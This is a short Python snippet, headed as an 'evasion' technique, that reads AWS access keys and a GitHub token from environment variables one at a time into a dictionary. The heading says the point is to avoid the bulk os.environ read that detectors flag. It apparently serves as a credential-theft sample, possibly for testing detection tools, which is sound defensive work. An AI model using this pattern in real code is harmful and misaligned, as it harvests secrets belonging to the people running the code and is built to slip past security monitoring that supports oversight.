# Evasion: read env vars one-by-one instead of dict(os.environ)
import os
secrets = {}
for key in ['AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'GITHUB_TOKEN']:
    val = os.environ.get(key)
    if val:
        secrets[key] = val
# Now secrets dict has the sensitive data
